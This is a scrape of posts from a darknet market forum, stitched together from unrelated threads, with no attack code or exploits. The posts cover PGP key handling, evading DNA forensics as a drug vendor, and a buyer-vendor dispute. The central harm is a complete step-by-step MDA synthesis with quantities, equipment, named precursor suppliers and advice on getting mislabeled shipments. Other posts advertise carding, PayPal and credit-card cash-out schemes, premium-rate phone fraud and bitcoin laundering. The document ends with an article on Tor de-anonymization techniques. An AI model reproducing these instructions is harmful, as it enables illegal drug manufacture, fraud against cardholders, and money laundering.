one private certificate. Attention: Please handle this file very carefully. It contains your private key and therefore information that is critical to security!  19.2 Import  To import your previously exported private certificate into Kleopatra, proceed as you would for importing other public certificates (see Chapter 10): Click on File -> Import certificate... and select the file to be imported. If it concerns a PKCS12 file (e.g. type .p12), the system will first ask you for a passphrase to unlock the private key: Now enter the prassphrase - which could also be a new one - that is used to protect your private key after the import is complete: Repeat the passphrase entry. If your passphrase is too short or consist only of letters, the system will give you a corresponding warning. Following a successful import, an information window displaying the results of the import process will appear; here is an example of a private OpenPGP certificate: Kleopatra has imported both the private as well as the public key from the backup file. Your certificate can be found in ""My certificates"" in Kleoatra's certificate administration. Please also save the backup copy of your private certificate - if possible on a physically secured (e.g. in a vault) external medium. Then delete it from your hard drive and also remember to remove the deleted file from your ""recycling bin"". Otherwise this file poses a great security risk for your secret e-mail encryption.There may be cases when you are not able to import a certificate exported with PGP (""Pretty Good Privacy""). This is because some PGP versions use an algorithm (IDEA) which cannot be supported by GnuPG for legal reasons. To take care of this problem, simply change the passphrase in PGP and export/import the OpenPGP certificate again. If this also does not work, set the passphrase in PGP to ""empty"", that is, no protection, and export/import again - in this case you must ensure that you have securely deleted the file and then set up a new real passphrase in PGP and Gpg4win. Congratulations! You have successfully exported and reimported your key pair.","halsinky87 wrote:yes mate pretty sure my pgp is still on my account.. and i have just been using kleopatra so i think i just exported it from there"

"Evolution Forums","DoctaShwartz","54392","2015-03-16T00:00:00","Assessing the forensic capabilities of law enforcement","Security & Anonymity","This has bounced around in my head for nearly a year now, largely in part from my insane paranoia and attention to detail. I've not seen it be done yet, but is it at all feasible for LE to recover DNA from a parcel to identify a vendor? I'm not talking like small hairs, moreso skin oils that get on the outside of gloves (such as in picking a pair to put on if not careful) or those transferred to actual product from handling. If LE were capable of extracting skin oils that contained DNA from something like a bud of cannabis, couldn't this tie back to the vendor? Seems stressful as fuck... I'd be afraid of even breathing in the same room as a shipment in packing. In the past I've found particulate matter and even small hairs in packaging before, and the thought of that getting into the wrong hands spells disaster to me. What precautions do vendors take to prevent this sort of thing? It's my understanding that there's no true database of DNA structure, and it's mostly ever employed as a database of DNA taken from crime/murder scenes to then be compared to suspects. I'm not sure if the notion of the US gov having our DNA is all that far-fetched... As a young kid in a Criminal Justice course in college we were brought to a station and all fingerprinted (and boy do I wish I refused at the time!), but it leads one to wonder. Aside from fingerprints as a left-behind token of a vendor, can other things like simple skin oil be a risk? (there was a recent LSD spectrum analysis that identified the oils of the skin and chalked it up to handling without gloves). What can really be extrapolated from what seems impossible to avoid making onto/into your packages in some way? It's like the Mythbusters episode of the toothbrush in the bathroom -- you can close the lid (put gloves on) but either way there's gonna be some trace amount of fecal matter (skin oils, in this case) on the toothbrush (package). This might be a topic more suited to the roundtable, however I'm not a vendor and the thought of this has been eating away at my brain for quite a while. Especially when you see photos on listings showing literal handfuls of pills or the vendor holding a slab of BHO... Isn't that a risk in itself?

The inside of the package is what's most worrisome, I would think. I wonder how prevalent of a vulnerability this could actually be, cost and effort aside... There must be a reason why it couldn't be feasible. They got SuperTrips from a fingerprint on clear tape, but certainly he would have been high enough value as a target to extract for genetic material? Interesting, nonetheless.","LucyUK wrote:Hi!They certainly can - However, it's unlikely they would bother...

"Evolution Forums","possum","49813","2015-02-14T23:10:12","Received empty box from ""reputable"" vendor, refusing to refund/reship","Security & Anonymity","BIG EDIT/UPDATE:So I had been asking for lots of advice on the forums about the situation. TheHappyGuy comes in to the forum the next day, spewing bullshit on all of my threads (I know I made a lot of threads, sorry) pretty much implying that I was lying in my posts, claiming he refunded my order and I was selectively, intentionally leaving out this detail. Except he NEVER TOLD ME HE REFUNDED THE ORDER.My last communication with him on Evo was basically nil, end of conversation, ""do not contact me again"", etc.-- no mention of refunding. All his previous messages said that he would not refund. so I didn't bother going back on Evo to check messages or anything since it seemed like it was over and there was no point, as I just could not get this guy to believe me. I also was now out of BTC so had no reason to go on Evo at all (and I probably wouldn't have been on again for at least another month). But he did refund, and didn't tell me, then blasted me on the forums to try to make it look like I was lying-- again. Trying to make me look like the bad guy and buy some sympathy/credibility for himself, I guess. He's now accused me of lying about the package being empty and then lying about intentionally leaving out a detail that I DIDN'T even know.His lie doesn't even make sense-- if I knew I had been refunded, why the hell would I be spending such a ridiculous amount of time on this forum trying to get advice to solve the problem? I HATE this forum!It's really a shame, because the guy has good products and he's really the type of vendor I would like to support (love buying directly from small-time growers), but this was just so unprofessional! I've NEVER had any experience even close to as terrible as this with a vendor. He ""never wants to work with me again"" now, despite the fact that I never lied to him, none of this was my fault, and have always been a trustworthy customer on the 3 years I've been on various markets. But I mean, I have no interest in working with a vendor that doesn't trust me and then flat-out makes up lies about me, so it doesn't matter anyway. tl;dr: THEHAPPYGUY is a slanderous, unprofessional vendor, and possibly a newly-minted selective scammer, since I still have no way of knowing if he sent an empty box or the contents were stolen.    I received a slightly squished, taped up, empty Priority Mail box. I'm pretty sure the contents of my order were stolen by a postal worker. The reason this seems more likely is that the vendor has very good stats and doesn't seem to be a selective scammer (unless I'm their very first victim, oh boy). The vendor will not reship or refund me the order, despite it being a very small order that they should be willing to pay the difference for (just to be professional!). They claim that they would be ""out of business in days"" if they reshipped orders to everyone who claimed an empty box (really? it happens THAT often?). They told me to reorder and they'd make it heavy. This doesn't seem fair that I should have to pay for it twice. Especially since the contents being stolen could be due to them not properly sealing it to begin with (the box wasn't ripped at all). So this could likely be at least somewhat the fault of the vendor. Important to note: The only reason I was ordering from this vendor is because I ordered from them last month (first order with them) and it was underweight, so they said they'd make it up to me on my next order. I usually like to try out new vendors/look for deals/etc. as I don't place many orders to begin with, but since they had promised me this I decided my very next order would be with them. So the fact that after this first issue they're now saying I have to order AGAIN is getting ridiculous and seems really unprofessional. A THIRD order, where if they hadn't messed up the very first order, wouldn't have even been necessary. How am I supposed to deal with someone who's either scamming me or just being really unprofessional when they seem to think I'M scamming THEM? What do most (reputable, non-scamming) vendors do when people don't receive orders? I thought that at LEAST a partial refund or reship was standard. Is this not the case? If it is, someone needs to tell this vendor because I can't seem to convince them. I've placed dozens of orders on various markets over the past 3 or so years, and never received an empty package or had anything like this happen before. My stats are good, and I'm a honest person, dammit! I think it's amazing that these markets exist and would never do something shitty like that and compromise my trustworthiness. This is so, so frustrating.

Simple. Leave a negative or neutral (depend on how you see it that way) feedback. Then find another vendor: that's the cost of doing business on the dark market.  If the vendor does a fantastic job - use them for your next and subsequent order. Simple. That's how I see it. BTW: did you escrow the order? I assume you FE'd early. I will never FE an order.

"" NOTE the lack of mentioning the refund. You NEVER mentioned that you refunded me in any message, and clearly this didn't happen until after this conversation had progressed.

This process can and has been done totally in a small apartment bathroom with a standard ceiling ventilation fan! No lab required! Many people ask how much it will cost the first time and how much is the reoccurring cost for fresh chemicals for the next batch. Around 800$ in equipment and 1200$ in chemicals to make a kg of MDA! This is a steal, 1kg of pure, uncut MDA is worth over:30,000 wholesale100,000 at the gram levelAlmost a Quarter Million at the individual dose level! Another common question is: do I need chemistry experience to do this? NO! If you can follow basic instructions you can do this process. It is very simple, the hardest part is understanding how to set up reflux (controlled boiling) and distillation (evaporating and condensing a solution). This process is done in 4 steps: step 1: can be scaled up infinitely, room temperature reaction with no smells, can be done in a 5 gallon bucket. This process takes about 8 hours, no need to watch it, pretty automatic. step 2: controlled boil, this is the bottleneck of the reaction. 1kg requires a 5L glass flask. This can be scaled up by using stainless steel containers. A small amount of distillation is required at the end to remove water. step 3: cold reaction requiring a bucket of ice then raising the reaction to about 60C and letting it cool. step 4: extraction using xylene and then drying and ""gassing"" this can be scaled up very large. This step yields incredibly pure MDA crystals and is the only point in which this process is illegal. Whether you are starting up in the business or a seasoned veteran it is well worth the cash. The tips in this guide will increase your yield, getting 1% more yield in a 1kg run, this guide pays for itself! Not only do you get knowledge which pays for itself but you get sources for the two hard to get chemicals. You do not need a business to deal with these companies! Everything else can be bought at your hardware store or ebay. Also I provide advice on making equipment, everyone knows how fucking expensive lab equipment is. This guide will take you from buying the chemicals and materials all the way to purifying your stash of MDA, end with either snow white powder which tests at 98%+ or go on to make moonrocks. Two moonrock methods are included, one allows you to make moonrocks netherlands style with a 15-20% cut like most ""pure"" sass/molly you see on the deepweb. The second process allows you take make moonrocks with no cut! Totally pure product in beautiful shards!

If you're country's laws are super tough on equipment then you can get around them with a mig welder, an angle grinder, and a few sheets of stainless steel. All the chemicals have legitimate industrial uses and are easy to obtain anywhere. There are two chemicals that are slightly harder to find outside of the US, but you can find manufacturers in china that will mislabel a package to ""avoid hazmat fees"".

"Evolution Forums","themostseekrit","23182","2014-09-09T03:37:45","Re: MDA Production Guide [BarnCat & SierraRomeo][$100]","Guides Vendors","NB: The following statement represents the opinion of solely myself, themosteekrit, based on my personal experiences. It does not, in any way, shape, or form, express the views of Evolution market or its staff. So I took a quick look at this earlier today when I had a moment, and I have to say it's pretty impressive. I'm not familiar with the synthesis routes for a lot of stimulants, and I was really surprised when I realised that a precursor like the one this guide is referring to actually exists (the biggest limiting factor here and in most syntheses would be obtaining the precursor, which thankfully this guide covers). Again, since I am not too well-versed in this specific subject and I since I obviously haven't tried it, I can't confirm it works, however this synthesis is not unheard of elsewhere and I have no reason to believe it shouldn't work. The guide is fairly detailed, but honestly I would still recommend some chemistry knowledge so you understand what's going on (and so you don't screw up because you don't know what you're doing). If you have literally no chemistry experience, you should still be able to complete it provided you are still able to follow the steps and know how to properly set up and perform everything. The descriptions and steps (more like four main paragraphs) are definitely adequate even if you are unfamiliar with the procedures. The requirements are also clearly listed, and while I haven't checked out the sources for the two harder-to-get chemicals, they are listed and detailed. Organisation and formatting are overall to my liking. That being said, although this guide is good, I feel obligated to point out that it still requires a lot of investment, time, and dedication. People with less experience tend to underestimate a lot of things, and are inclined to think that making drugs is easy money the same way someone would believe that you can make thousands on your first day of carding, or buy dumps and PINs to cash out. Yes, this guide aims to make the process as simple and attainable as possible (which it does a good job of), but if you have never worked with drugs or chemicals before, don't expect to just be able to buy this, glance over it one afternoon, throw a few chemicals together on a whim, and make a shittonne of pure MDA. If you haven't figured it out already, nothing in life is that easy. Also, a guide can only help you so much before actual brainpower is required. If you just want to learn a bit about drug chemistry and get some ideas to start off, I'd recommend reading the Rhodium archives on erowid.org and searching for additional information. Just to clarify again, this guide is still a quality guide, and the procedure is still easy, just I don't want any newcomers trying to make a quick buck come here and then turn out disappointed. Don't really know what else to add in, so if I'm forgetting something or if you have any other questions, post them here and I or someone else can answer them.",""

Some quite indepth chemistry for sure.  There was someone called Ron Paul and Dr deep wood selling mda production guides utilising helional but the reaction documents miss out certain very important piece of that ultimately results in failed reaction. There are clandestine chemistry forums on the Web where this is discussed.  Using TCCA with the Hoffman rearrangement is one of the latest variations to show good consistent high yields.

If BarnCat is writing a guide on how to methylate MDA to MDMA, that doesn't sound like too much fun nor does it sound very effective. As far as I know, the synthesis outlined in this guide is only for MDA, and MDMA is synthesised from other routes. If he's planning on writing a guide similar to this one but for MDMA using a different starting point and reagents, then that's cool. I honestly don't think the guide was organised poorly at all. Honestly though, I prefer MDA. MDA is like MDMA's older, cooler brother.","Cocainecowboy wrote:I doubt converting mda to mdma is something anyone here can do and not a simple process.

List of Equipment/Chemicals: Equipment: one time cost ~500$----5 gallon buckets x3: 10$5L 24/40 boiling flask: 60$300mm+ 24/40 condenser: 40$24/40 distillation adapter set: 50$lab stand, clamps and other connectors: 40$Rubber stoppers for 24/40 flask neck + hard opaque tubing: 5$2L seperatory funnel: 60$buchner funnel: 40$drill with paint mixer adapter: 60$hotplate (1500W+): 70$water aspirator: 40$ OR rotory vane pump 90$2 gallon wine glass carboy: 10$ Chemicals: reoccuring cost ~1200$----5kg helional (sources included): 400$3.5kg hydroxylamine HCL (sources included): 300$10L methanol/ethanol/IPA: 60$5kg calcium carbonate (pH up at walmart pool section): 20$10 gallons xylene : 200$150g nickel acetate: 30$3kg NaOH (Lye): 30$5kg sodium bisulfite: 70$14 gallons 6% bleach (chlorox): 30$1 gallon 30% HCl (muratic acid): 20$3kg calcium chloride (damprid): 20$500g magnesium sulfate (epsom salts): 10$  Helional: Vigon international, mails in a discreet cardboard box containing a stainless steel drum hydroxylamine.hcl: kyantec, don't be sketchy doing buisness with him, be straight to the point, send him a money order and have the container delivered to your local UPS store, no box needed, just mail it to the store with your name and pick it up. It must ship to a buisness because it is hazmat. Oximation:2.5kg of aldehyde (helional) is added to ~5L of methanol, a solution of 2.5L H2o with 1.75Kg hydroxylamine hcl is premixed and added to the container. This should be done in a 5 gallon bucket with an overhead stirrer or mounted drill/harbor freight drill press/whatever. Use a hardware store paint mixer drill attachment. Calcium carbonate at 2.5kg is added slowely into the reaction. This is the major sticking point of the process, most methods say to add the calcium carbonate in liquid form, but the excess liquid will ruin the reaction, causing another compound to form which looks similar but will not work! Evidence of this is a solid compound which looks like snowflakes and has a low melting point.You want to add the calcium carbonate DRY, NOT IN SOLUTION. This is tricky because if you add it too fast it wont dissolve, it will sink to the bottom and mix with the oxime which is precipitating out, making it a pain in the ass. To do this reaction right you need a container with a small hole at the bottom slowely pouring dry base into the reaction. By Slow I mean 1/2 cup an hour or so. This container will tend to clog depending on your partical size. You can fix this by either running the stirrer through the container so the powder falls between the crack of the shaft and the container hole. Another way is to attach a folded over peice of electrical tape to the stirrer and have it smack into the pouring container, which will dislodge it any time it gets stuck. Once this reaction runs for 8 hours or however long it takes to meter in the powder, turn off the stirring. Pour this bucket into a bucket half full of cold water. You should have a large white/green cake at the bottom of the reaction bucket. There may also be material which crashes out upon addition of the cold water. The best you can do is to meter it in slow so you get a cake, if you did it too fast and your base collected on the bottom and you pour it into the water solution you may get loose oxime which could be any color from white to yellow to green. Go for the cake. If you want to clean this oxime, which is not necessary unless you can see base and oxime mixed, you can dissolve it in methanol, then add a large excess of water to crash it out. Calcium carbonate will stay with the water while the oxime can be collected. Also hot water can be added to the oxime to melt it and also absorbe base, if you dont want to use methanol. The trick to this reaction is to not use excess water, this is where 99% of the failures of this reaction happen. Too much water and the product which you get is not an oxime, but another unidentified compound. This will dissolve in xylene and the rest of the process will seem right until you do the hoffman, and it will tar up or fail. A good test is to take a rice sized peice of oxime and burn it on foil, it should melt and then decompose with popping and crackling, and leave a sharp aroma in the air. Yield should be around 90-100%, sometimes showing 100% with water and base impurities. It will be a hard waxy material that could range in color from white to yellow or sea green. Beckman:1kg of the aldoxime is mixed with ~3L of xylene and 20-25g Nickel Acetate in a 5L flask. The lower end is fine, the higher end will increase your yield a little but also make the amide harder to clean. Install magnetic stirrer and then pound the aldoxime into small chunks that can fit into the 24/40 flask neck then add xylene. Install ice water cooled 300mm+ condensor and place on hotplate with boiling chips (broken ceramic pots or brick work fine). Bring the heat up, leaving the condensor on for smell control, dont forget a large inflated punch balloon on top. Let the oxime dissolve. Should dissolve before reflux. 20-25g of Nickel Acetate is added to the hot solution but well before its boiling to prevent bumping. The solution is refluxed for 5 hours and then switched to distillation. During this time the solution goes from light green to very dark green cola colored. Wear a gasmask and stop stirring right before you switch the glass, starting stirring immediatly after distillation is set up. The solution is distilled, a white milky water azetrope will distill over first and then clear xylene. Once the temperature raises and the xylene starts coming over you can turn off the heating. A good indicator is when the flask clears and water droplets are no longer visible. At this point the reaction is dry of water and crystalization should be easy. More xylene can be distilled off to be safe but its not necessary. If distillation is skipped or halted and water remains in the solution you can expect only 20% of the amide to crystalize. The solution is left to cool until it is around 70C. At this point it is still very hot but this is when you need to work with it. If you allow it to get too cool it will crystalize in the flask and you will have to reheat and start the cooling process again. Pour this solution while wearing a gasmask between 2 walmart vacuum chamber lined coffee pots (or into a container for instant crystalization into a sludge but I like being able to pour out impurities from the large crystals). A small hole should be punched/drilled in the outside of the container to remove the vacuum, or else it will cool way too slow, you wil be waiting for days. Once the solution is cooled 24 hours later you can pour the nasty black xylene out from the crystal structure, let them drain upside down over the toilet. Scoop out the amide and store in a sealed 5 gallon container unit you accumulate enough, the next step is smelly and should be done in one run if possible. Pack the crude amide into a very large buchner funnel, which is placed into a glass apple cider carboy with a hole drilled and hose barb epoxied in. To make the hose barb stick better buy a plastic one and cut off everything but the barb. Using a dremel tool cut an X into the back of the hosebarb. These channels can be squeezed together and then pushed into the hole of the carboy to make a nice lock/friction connection, seal with minimal epoxy. Pour room temperature xylene over the amide while running the pump until the xylene comes out clear. Pressing on the cake with something during the process helps reduce channeling and speed drying. This can end up being around 2 liters + xylene for each kg of amide, but the purity is very important for high yields in the next step. Once the xylene runs clear let the pump run for a while. You should now have sandy tan amide which smells of xylene. Preferably lay this out in thin layers in a very well ventillated area for a few days before use, if you can remove all traces of xylene the powder will flow freely and dissolve very well in the next step, which really boosts yields. Yield should be around 70-85%, Melting point 125-130C. Hoffman: Put a 5 gallon bucket on a scale and add 12kg of 5.5% bleach, add 600g of NaOH and about 3 liters of ice cubes. Prepare another 5 gallon bucket with 2 hose barbs, one on the side near the bottom and one maybe 10 inches above that. Make the lower hose barb the same size as your water pump hose and the upper barb a size larger. Fill a cooler with around 40 pounds of ice and enough water to cover the pump, maybe tilt it toward the pump. Add the hoses and place the 5 gallon reaction bucket inside of the modified cooling bucket, clamping the two buckets together. Clamp an overhead stirrer/drill with a drill paint mixer attachment onto the bucket and start stirring. Add 1kg amide and stir as fast as possible without splashing. Let this stir for around 14-24 hours, or until the ice in the cooler melts. Do not allow the reaction to warm to room temperature for very long, or else your initial batch will be dirtier. Longer will result in higher yields. The color will be a light yellow or orange if the reaction is a little more then done. There will still be unreacted amide chunks floating around, dont worry about it. At his point add 900g sodium bisulfite/metabisulfite while stirring slowley by hand. Wait an hour or so and pour off the much clearer solution through a cloth into another container. The original container will have a brown goo layer at the bottom. This is half your yield and the raw goo should weigh around 700g. Add this goo and anything on the filter to a container and put in the freezer until you have goo from enough runs to distill. The clear, piss colored solution is added to 5L of 10% NaOH in a large stainless steel cooking pot, which is placed on a 1500w+ hotplate with stirring. This setup is wrapped with fiber insulation which is clamped together with a paperclip, then wrapped in foil, including the lid. A thermocouple or thermometer is attached and the plate is set to full heat. The solution is brought to exactly 80C and held for 30 minutes depending on your hotplates power this could take an hour or two to come up to heat. Afterwards the insulation is removed and the solution is cooled overnight. A higher yielding method would be to have a large pot with the 5L of 10% base kept at 80C and the solution dripped on it, maintaing temperature. This is tedious but can be automated with a ebay PID controller in cooling mode with a 120V AC solenoid hooked to a gravity feed of the chloroamine solution. The cooled solutions are stirred while adding 3 liters of xylene at a time. This is allowed to stir at low speed to prevent emulsions for 30 minutes+. Then a small bucket is lowered carefully into the xylene topped reaction mix. it is tilted to allow the xylene layer to flow into it with minimal aqueous solution. This bucket is then poured into a collection bucket until the lower aqueous contaminant layer is close to coming out, then it is poured into a 2L seperatory funnel and the bottom portion returned to the mother solution. It will take around 3 gallons of xylene to pull this solution, you will know when you are done because emulsions will start forming and be very visible between the layers. To the xylene collection bucket is added 20% of its volume as 10% naoh solution to wash it a few times. The top xylene layer is poured off and the bottom layer is seperated as before. The clean orange colored xylene layers are added together and are ready for drying. A cup of epsom salts is microwaved while grinding every few minutes until it all looks dry and white, no longer clear. This is dehydrated epsom salts, very hydroscopic and can not be stored, must be made day-of. It is hammered to powder it a little. A few rocks are placed into a large plastic funnel to provide a flat base and then a filter paper is placed over it. The warm dry epsom salts are poured into the funnel providing a layer atleast 1.5 inches thick. This is placed into a small hole in a bucket, which is placed so that the seperatory funnel drips directly onto the filter and into a dry bucket. Once this xylene has been filtered it will be a very clear orange solution, ready for gassing. If its cloudy dry again or else you will slay your yield, so drip dry it slowely the first time. MAKE SURE IT IS CLEAR OR DRY AGAIN. Once you have this clear solution in a bucket set up a HCL gas generator. This is done by placing about 1kg damprid in a flask with a stopper which has a hole for tubing. Add 20ml of muratic acid at a time to the flask and quickly replace the stopper. As the gas bubbles through mda.hcl will precipiate, keep filtering every time the gas runs out but before you add more muratic acid to the generator. Once no more crystal crops crash out you got it all. This solution will contain around 350g MDA.hcl after gassing. Once you run this rxn 3 times you have enough goo in the freezer. This is secondary and will actually bring your yield somewhere around 2kg. This will need to be vacuum distilled 2 times or fractionally vacuum distilled once. The light orange/yellow freebase should be mixed with 30% 99% IPA and titrated with diluted HCl, and then the IPA distilled off with a vacuum at low temperature, or at atmospheric pressure and higher temps. Also xylene can be used instead of IPA and just distilled until the temperature raises/flask clears/water leaves and then cooled for an easier to manage crystalization. After gassing the material should be washed with acetone and then preferably dissoled in hot methanol or dry IPA and dripped into a spinning cool acetone solution, then filtered. To make moonrocks there are 2 methods, one introduces a 20% cut, the other does not method 1: 20% cutMake anhydrous epsom salt in the microwave as above, for every 10g mda, use 2g dehydrated epsom. For 10g mda first dissolve 2g anhydrous epsom in 8ml of almost boiling distilled water. When it is mostly dissolved quickly add your mda and stir heavily, keep this heated to almost boiling. On cooling this will create a moonrock. If you want a sexy clear moonrock then let it cool at around 30C on a hotplate or heatmat overnight, if you want a fast cloudy moonrock like most dutch crystals then cool it faster. method 2: no cutfor 10g mda use 250ml acetone, place the mda in the acetone, it will not dissolve. carefully heat the acetone to almost boiling (dangerous fumes) and slowly stir and add water dropwise SLOW. When all the mda dissolves in the solution very slowly cool it. The slower the sexier the moonrocks. pour off the excess acetone.",""

If you're a noob scared about getting caught, the setup of this means you're completely anonymous and hypothetically if the cops caught you, all you'd need to do is (literally) burn the usb and you'd be safe.If you've got semi-clean PPs that you need to clean, all you need is to have a US one to transfer them to, and you'd be able to clean them to anonymous Bitcoins in less than half an hour!If you've got CCs you need to empty, and one US PP to use, you could empty the CC funds onto the PP and then into bitcoins in less than an hour. Literally the only difficulty of this whole guide is the original setup to stay safe and then setting up seperate accounts on the websites I provide.

Two days ago I tried out the method to appease a buyer and from a $40 investment in CCs and PPs, cashed out just under $345 in 4 hours! Also, the websites will eventually cotton on and bump their security, but I've got a couple other sites in my back-pocket to give out to buyers once that happens",""

Now, I've given all my buyers another PP --> UKASH --> BTC method that is still working but it only uses EU paypals, and is quite badly written so I'm taking the listing down until I've written one that works. As I said before I've got 2 other methods that are still working fine, but I'm not sure how willing I am to give those out yet so I'll be researching a newer/revised method over the next week or so.  If people are desperate for cash I'm selling 5 x Â£50 copies of one PP-->Ukash-->BTC method that I gave to my other buyers that is definitely working as of 24th April, but it uses foreign websites and may be difficult to understand. Will still make money off it though after 2 transactions tops. http://k5zq47j6wd3wdvjq.onion/listing/11032",""

Tools: VM, CCLEANER, GOOD SOCKS OR VPS OR RDP, carding knowledge to reset VBV, I can recommend suppliers ofcourse.

Q: Does it work by them simply calling back, or could I also earn money if I keep them on the line?A: Different PRN providers use different billing plans, but in most of them you will earn more money if the target stays more on the line. Q: Are there any additional payment required to make this work?A: No, you need to pay only for tropo.com line&bills and a PRN. Additionally, if you chose you can buy also a webhosting and a domain. PRN stands for Premium Rate Number.  This product does everything for you,you just have to copy paste 2 numbers and make a few clicks for the money to pop in!

This is for the US only.This has been tested by myself and people I know personally and has worked multiple times with varying amounts. I am only selling a limited amount of these. Once it sells out, no more.I have used this and I want to give something back as I have learned a lot since coming to Evo and TCF.$100 is small compared to what you will get back. Just doing it once successfully will be enough to bring a good amount of profit. I'd like to give out a couple to reputable members for reviewing it's content before doing so - if you reckon i should change the price after reviewing let me know. Criticism/Opinions are more than welcome Price is $100 selling 7 copies.Certain things in the method could change over a period of time, but I don't see this happening for now. This has been written for the way I have personally had success recently (As recent as mid/end February) Included is the method used, sites to aid success and briefly noted are a few cashing out methods for after you get the loan. However the main focus of the guide is on the loans. If you have any questions don't hesitate to get in contact.

That is that the ATM collects no information about you, and you can be sure there is no surveylence of the transaction. The possibilty of this happening is basically zero.  The temporary wallet is a matter of choice. Web service based wallets like the ones offered by blockchain.info are a popular option. So are wallets that will run on a mobile device such as mycellium. It really doesn't matter which option you choose as long as the wallet is not insecure and you have the private keys to the addresses in the wallet. The selection and setup of the bitcoin laundering service is the most difficult aspect. If the service requires registration, you will want to register anonymously using Tails to access the service. Each service has their own setup and requirements. No service has total safety and total security. You can get a list of some of them at https://en.bitcoin.it/wiki/Category:Mixing_Services (clearnet link) -- do your homework and read up on any service before selecting one, just because it's in that link or not in that link does not ensure it's safe or secure. Make sure the output address in one of the unused deposit adresses in your electrum wallet.

Another person who bought your CC to BTC method here did tell me that it didn't work for him either. This method wasn't very cheap either. I tried asking you for a refund and you didn't seem to entertain me very well, knowing yourself that this method has already been burned and there is no way it can be used.I feel that i got cheated because I followed your instruction comprehensively, and i purchased all the tools needed to get it work, what happened to your ""lifelong support""?  it saddens me that you are avoiding all my messages when i am seeking for more information to get it done. I did try to offer my help to you by ""claiming"" my refund back in exchange for some help to you, but throughout these days , it kept me thinking.. why do I need to do that? And it really pissed me off when you commented on me as being : ""You sound just like an indian guy i met here""... how did this statement suddenly come into place, i wonder? any relevance to the way i speak with the refund? again, I think it's unfair that i am being treated like that, i still know my rights and what's justifiable and what's not. Posting a thread on evo is definitely my last resort, as much as I respect you as a friend, my gestures were not appreciated by you at all. Sorry to say this, but I want my refund back now..

"Evolution Forums","popadoppalus","51287","2015-02-22T05:37:13","how LE tries to de-anonymize TOR users","Security & Anonymity","Hacking the Tor Network: Follow UpPosted in Hacking on January 6, 2015Introduction In a previous post, I presented the main techniques used to hack Tor networks and de-anonymize Tor users. Law enforcement and intelligence agencies consider âde-anonymizationâ of Tor users a primary goal. Authorities can try to implement techniques to break the encryption used to anonymize the traffic or to exploit vulnerabilities in one of the software modules that allows anonymizing the userâs online experience. There is also another option for authorities: to try secretly to destroy the overall Tor architecture or attack the hidden services to interfere with the traffic that flows to them.Operation Onymous Since the publication of the last post, a blow was dealt by the authorities to the cybercriminals that use the Tor network for illegal purposes. Police and intelligence agencies in a joint effort conducted the takedown of several illegal marketplaces as part of Operation Onymous. Coordinated by Europolâs European Cybercrime Centre (EC3), Operation Onymous hit the criminal organization that exploited the Tor network to manage black markets. The operation is considered an important success in the fight agaisnst cybercrime, but many experts have begun to question how law enforcement was able to locate the servers hosting hidden services and operators who ran the illegal activities. The developers of the Tor Project published an interesting blog post titled âThoughts and Concerns about Operation Onymousâ, in which they have explained the possible techniques adopted by authorities to locate the hidden services and de-anonymize the operators that managed the most popular black markets, including Silk Road 2.0. âOver the last few days, we received and read reports saying that several Tor relays were seized by government officials. We do not know why the systems were seized, nor do we know anything about the methods of investigation which were used,â states the post. The principal assumptions that law enforcement has made on the possible attack scenarios implemented by the law enforcement are:     Lack of operational security of hidden services    Exploitation of bugs in the web application    Bitcoin de-anonymization    Attacks on the Tor network The members of the Tor Project highlighted that the police has compromised the anonymity of the location of the servers behind the hidden services due to the lack of one of the following conditions:     The hidden service must be properly configured.    The web server should be not vulnerable: this means that it must be not affected by any flaw and must be properly configured.    The web application should have no flaws. An attacker that is able to exploit a vulnerability in the web server or in the web application (e.g. the e-commerce system exposed by the operators to propose the illegal products) could easily hack the targeted hidden service. Resuming, to de-anonymize Tor users it is possible to compromise a poorly configured server or the web application it exposes, and there is no need to search and exploit an alleged vulnerability in Tor architecture. By exploiting a vulnerability in a third-party application used by a dark marketplace, it is possible to install a backdoor on the server, revealing its location and the identities of its operators. Another possibility for law enforcement is to infect the machine of one of the alleged administrators with a spyware. The computer could be localized through ordinary investigations.Traffic analysis attack based on NetFlow Exactly one week after the disclosure of Operation Onymous, a group of researchers presented the findings of a study conducted between 2008 and 2014 on the de-anonymization of the Tor users. The researchers analyzed the possibility to identify Tor users and reveal their originating IP addresses; they claimed to have obtained a 100 percent âdecloakingâ success rate under laboratory conditions. The group led by professor Sambuddho Chakravarty, now researching Network Anonymity and Privacy at the Indraprastha Institute of Information Technology in Delhi, has published several papers on the topic over the last few years. The study revealed that more than 81 percent of Tor clients can be de-anonymized by exploiting the NetFlow technology designed by Cisco for its network appliances. NetFlow was introduced by the IT giant into its routers to implement an instrument to collect IP network traffic as it enters or exits an interface. It is a precious instrument to analyze the network traffic managed by the router and identify the causes of congestion. The protocol is widespread, and many experts consider it as a standard de facto. It actually runs by default in the hardware of many other network device manufacturers. The technique proposed by Chakravarty and his team implements an active traffic analysis based on the introduction of specific traffic perturbations on server side. The researchers are able to de-anonymize Tor users by evaluating the effect of a similar perturbation on the client side through statistical correlation. In a previous study, Chakravarty demonstrated that an attacker can monitor a signiï¬cant percentage of the network paths from Tor nodes to destination servers by having access to a few Internet exchange points. The control of a few Internet exchange points allows the monitoring of a signiï¬cant percentage of the network paths from Tor nodes to destination servers. This means that a powerful and persistent attacker can run trafï¬c analysis attacks by observing similar trafï¬c patterns at various points of the network. The last study conducted by the team of researchers has revealed how to run an effective traffic analysis attack with less trafï¬c monitoring capabilities, such as Ciscoâs NetFlow, and run a trafï¬c analysis attack on a large scale. Previous research, in fact, suggested a significant effort to de-anonymize users on a large scale. The experts consider that previous techniques required an effort sustainable only by a government or by an intelligence agency. The researcher explained that a single AS (Autonomous System) could monitor more than 39 percent of randomly-generated Tor circuits. A traffic analysis attack elaborated in the last study doesnât request the enormous infrastructural effort as the previous techniques do, but it exploits one or more high-bandwidth and high-performance Tor relays. The team used a modified public Tor server, hosted at the time at Columbia University, running on Linux for its tests. Figure 1 â Traffic Analysis based on NetFlow The group of experts simulated the Internet activity of a typical Tor user: they injected a repeating traffic pattern (i.e. HTML files) into the TCP connection that they saw originating in the target exit node, and then analyzed the traffic at the exit node, as derived from the routerâs flow records, to improve client identification. Figure 2 â Traffic Analysis attack In the first phase, the researchers conducted specific tests in a lab environment with surprising results. In the second phase, the team started the live sessions using real Tor trafï¬c. The team analyzed the traffic obtained from its public Tor relay that served hundreds of Tor circuits simultaneously. The targeted victims were hosted on three different locations in the Planetlab, the global research network that supports the development of new network services. The chosen locations were Texas (US), Leuven (Belgium) and Corfu (Greece). The victim clients downloaded a large ï¬le from the server that deliberately introduced perturbations in the arriving TCP connectionâs trafï¬c, thereby deliberately injecting a trafï¬c pattern in the stream between the server and the exit node. âThe process 